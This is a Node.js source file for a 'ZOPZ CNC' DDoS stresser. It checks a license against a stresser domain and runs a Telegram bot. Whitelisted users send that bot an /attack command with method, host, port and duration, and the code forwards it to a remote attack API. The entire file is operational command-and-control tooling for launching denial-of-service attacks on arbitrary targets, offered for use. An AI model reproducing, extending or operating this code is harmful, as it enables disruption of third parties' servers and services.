const os = require('os');
const fs = require('fs').promises;
const fsv2 = require('fs');
const path = require('path');
const dns = require('dns');
const https = require('https');
const TelegramBot = require('node-telegram-bot-api');

// Path to methods config
const methodsConfig = path.join(__dirname, './configs/methods.json');
const settings = path.join(__dirname, './configs/main.json');
// Override dns.lookup to force IPv4 resolution
const originalLookup = dns.lookup;
dns.lookup = function(hostname, options, callback) {
  if (typeof options === 'function') {
    callback = options;
    options = {};
  }
  options.family = 4;
  originalLookup.call(dns, hostname, options, callback);
};

// Check if the platform is Linux; exit if not
//if (os.platform() !== 'linux') {
//  console.log('This script must be run on a Linux server.');
//  process.exit(1);
//}

// Load and evaluate external scripts
eval(fsv2.readFileSync('./Entry.js', 'utf8'));
eval(fsv2.readFileSync('./utils/json-stuff.js', 'utf8'));
eval(fsv2.readFileSync('./utils/hardware.js', 'utf8'));
eval(fsv2.readFileSync('./utils/Base64.js', 'utf8'));

// Load configuration from JSON file
const config = JSON.parse(fsv2.readFileSync('./configs/main.json', 'utf8'));

// Initialize state
let STARTED = false;
const MAX_RETRIES = 4;
const FATAL_ERRORS = ['invalid_key', 'key_expired', 'server_slots_exceeded', 'already_active', 'key_banned', 'hwid_mismatch'];

// Function to load methods from config
async function loadMethods() {
  try {
    const raw = await fs.readFile(methodsConfig, 'utf8').catch(() => '{}');
    const methodsData = JSON.parse(raw);
    return Object.keys(methodsData).map(method => method.toLowerCase()); // Normalize to lowercase
  } catch (e) {
    console.error('Error loading methods config:', e.message);
    return [];
  }
}

// Function to validate license key
async function validateLicense(key, retryCount = 0) {
  const hardwareId = globalThis.getHardwareId();
  const retryMessage = retryCount > 0 ? ` (retry ${retryCount})` : '';

  const requestOptions = {
    hostname: 'legit.zopzstress.st',
    path: `/api/validate?key=${encodeURIComponent(key)}&hwid=${encodeURIComponent(hardwareId)}`,
    method: 'GET',
    headers: { 'Content-Type': 'application/json' }
  };

  return new Promise((resolve, reject) => {
    const req = https.request(requestOptions, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const response = globalThis.parse(data) || {};
          if (!response.type) {
            console.log('Invalid response from server');
            return reject(new Error('Invalid response'));
          }

          switch (response.type) {
            case 'auth_success':
              const datetime = new Date();

const formatted = `${datetime.getFullYear()}-${String(datetime.getMonth() + 1).padStart(2, '0')}-${String(datetime.getDate()).padStart(2, '0')} ${String(datetime.getHours()).padStart(2, '0')}:${String(datetime.getMinutes()).padStart(2, '0')}:${String(datetime.getSeconds()).padStart(2, '0')}`;
              console.log(`${formatted} [OK] [48;5;238m[97mAuthenticated!\x1b[0m` + retryMessage);
              if (!STARTED) {
                STARTED = true;
                globalThis.init();
              }
              resolve();
              break;
            case 'log':
              console.log('Received error:', response.message);
              if (FATAL_ERRORS.includes(response.message)) {
                console.log('Fatal error detected:', response.message);
                reject(new Error(response.message));
              } else {
                reject(new Error('Validation failed'));
              }
              break;
            default:
              reject(new Error('Unknown response type'));
          }
        } catch (error) {
          console.log('Error parsing response:', error.message);
          reject(error);
        }
      });
    });

    req.on('error', (error) => {
      console.log('Connection error:', error.message);
      reject(error);
    });

    req.end();
  }).catch((error) => {
    if (FATAL_ERRORS.includes(error.message) || retryCount >= MAX_RETRIES) {
      console.log(FATAL_ERRORS.includes(error.message) ? 'Authentication failed. Not retrying.' : 'Max retries reached.');
      process.exit(1);
    }
    console.log('Validation failed' + retryMessage + '. Reconnecting in 2 seconds... (' + (retryCount + 1) + '/' + MAX_RETRIES + ')');
    setTimeout(() => validateLicense(key, retryCount + 1), 2000);
  });
}

// Function to send attack request
async function sendAttackRequest(username, password, host, port, time, method) {
  return new Promise((resolve, reject) => {
    try {
      const url = new URL(`${config.Telegram_attackdomain}api/attack?`);
      url.searchParams.append('username', encodeURIComponent(username));
      url.searchParams.append('password', encodeURIComponent(password));
      url.searchParams.append('host', encodeURIComponent(host));
      url.searchParams.append('port', encodeURIComponent(port));
      url.searchParams.append('time', encodeURIComponent(time));
      url.searchParams.append('method', encodeURIComponent(method));

      const requestOptions = {
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'GET',
        headers: { 'Content-Type': 'application/json' }
      };

      const req = https.request(requestOptions, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
          console.log('Raw API response:', data);

          if (!data) {
            console.error('No data received from API');
            return reject(new Error('No data received from API'));
          }

          let response;
          try {
            response = JSON.parse(data);
          } catch (parseError) {
            console.error('Error parsing API response:', parseError.message);
            return reject(new Error('Invalid API response format'));
          }

          if (!response || typeof response !== 'object') {
            console.error('Invalid response structure:', response);
            return reject(new Error('Invalid API response structure'));
          }

          if (response.success) {
            console.log('Attack request successful:', response);
            resolve(response);
          } else {
            const errorMessage = response.message || response.error || 'Attack request failed';
            console.error('Attack request failed:', errorMessage);
            reject(new Error(errorMessage));
          }
        });
      });

      req.on('error', (error) => {
        console.error('Network error during attack request:', error.message);
        reject(new Error('Network error: ' + error.message));
      });

      req.end();
    } catch (error) {
      console.error('Unexpected error in sendAttackRequest:', error.message);
      reject(new Error('Unexpected error: ' + error.message));
    }
  });
}
// Cleanup function
function cleanup() {
  process.exit();
}

process.on('SIGINT', cleanup);
process.on('SIGTERM', cleanup);

// Start license validation
validateLicense(config.key);

// ========== TELEGRAM BOT SETUP ==========

if (config.enable_telegram_bot && config.telegram_token && config.whitelisted_userids) {
  const bot = new TelegramBot(config.telegram_token, { polling: true });
    const datetime = new Date();
    const formatted = `${datetime.getFullYear()}-${String(datetime.getMonth() + 1).padStart(2, '0')}-${String(datetime.getDate()).padStart(2, '0')} ${String(datetime.getHours()).padStart(2, '0')}:${String(datetime.getMinutes()).padStart(2, '0')}:${String(datetime.getSeconds()).padStart(2, '0')}`;
  console.log(`${formatted} [OK] \x1b[48;5;238m\x1b[97mTelegram bot is now running.\x1b[0m`);

  bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, 'Welcome to ZOPZ CNC Bot!\nUse /help to view available commands.');
  });

  bot.onText(/\/help/, (msg) => {
    const helpMessage = `
*Available Commands*:
/start - Welcome message
/help - List commands
/status - Check attack status
/methods - List available attack methods
/attack <method> <host> <port> <time> <username> <password> - Start an attack
    `;
    bot.sendMessage(msg.chat.id, helpMessage, { parse_mode: 'Markdown' });
  });

  bot.onText(/\/status/, (msg) => {
    const userId = msg.from.id;
    if (!config.whitelisted_userids.includes(userId)) {
      return bot.sendMessage(msg.chat.id, '������ Access Denied: You are not whitelisted.');
    }
    const statusText = config.attacksenable ? '✅ Attacks are ENABLED' : '❌ Attacks are DISABLED';
    bot.sendMessage(msg.chat.id, `������ System Status:\n${statusText}`);
  });

  bot.onText(/\/methods/, async (msg) => {
    const userId = msg.from.id;
    if (!config.whitelisted_userids.includes(userId)) {
      return bot.sendMessage(msg.chat.id, '������ Access Denied: You are not whitelisted.');
    }
    const methods = await loadMethods();
    if (methods.length === 0) {
      return bot.sendMessage(msg.chat.id, '❌ Error loading methods config.');
    }
    const methodsList = methods.join('\n');
    bot.sendMessage(msg.chat.id, `������ Available Attack Methods:\n${methodsList}`, { parse_mode: 'Markdown' });
  });

  bot.onText(/\/attack (.+)/, async (msg, match) => {
  const userId = msg.from.id;
  if (!config.whitelisted_userids.includes(userId)) {
    return bot.sendMessage(msg.chat.id, '������ Access Denied: You are not whitelisted.');
  }

  const args = match[1].split(' ').map(arg => arg.trim());
  if (args.length !== 6) {
    return bot.sendMessage(msg.chat.id, '❌ Invalid command format. Use: /attack <method> <host> <port> <time> <username> <password>');
  }

  // Preserve password case, lowercase other args
  const [method, host, port, time, username, password] = args.map((arg, index) => index === 5 ? arg : arg.toLowerCase());
  const methods = await loadMethods();

  if (!methods.includes(method)) {
    return bot.sendMessage(msg.chat.id, `❌ Invalid method. Available methods:\n${methods.join('\n')}`);
  }

  const portNum = parseInt(port, 10);
  const timeNum = parseInt(time, 10);
  if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
    return bot.sendMessage(msg.chat.id, '❌ Invalid port number. Must be between 1 and 65535.');
  }
  if (isNaN(timeNum) || timeNum <= 0) {
    return bot.sendMessage(msg.chat.id, '❌ Invalid time. Must be a positive number.');
  }

  if (!config.attacks_enabled) {
    return bot.sendMessage(msg.chat.id, '❌ Attacks are currently disabled.');
  }

  try {
    const response = await sendAttackRequest(username, password, host, portNum, timeNum, method);
    bot.sendMessage(msg.chat.id, `✅ Attack started successfully:\nMethod: ${method}\nHost: ${host}\nPort: ${port}\nTime: ${time}s`);
  } catch (error) {
    bot.sendMessage(msg.chat.id, `❌ Failed to start attack: ${error.message || 'Server error'}`);
  }
});

  global.telegramBot = bot;
} else {
  console.warn('⚠️ Telegram bot not started: Missing token or chatId in config.');
}